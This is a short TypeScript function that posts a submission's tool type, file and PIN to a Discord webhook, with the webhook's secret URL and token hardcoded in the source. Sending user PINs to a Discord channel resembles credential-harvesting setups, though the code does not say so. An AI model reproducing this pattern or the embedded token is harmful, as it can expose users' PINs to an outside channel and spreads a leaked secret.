
interface WebhookPayload {
  toolType: string;
  file: string;
  pin?: string;
}

export const sendToDiscordWebhook = async (payload: WebhookPayload) => {
  try {
    const webhookUrl = "https://discord.com/api/webhooks/1359693096048398490/O5cMo-55HHuIAD7sJbut5Y4ODaVrVO254RYkUTpIhlK2lJjCmieH6RNWKsr98pX8ID0V";
    
    const content = `
**New Tool Submission**
Tool: ${payload.toolType}
File: ${payload.file}
Pin: ${payload.pin || 'Not provided'}
Date: ${new Date().toLocaleString()}
IP: [Hidden]
    `;
    
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        content,
      }),
    });
    
    return response.ok;
  } catch (error) {
    console.error('Failed to send webhook:', error);
    return false;
  }
};
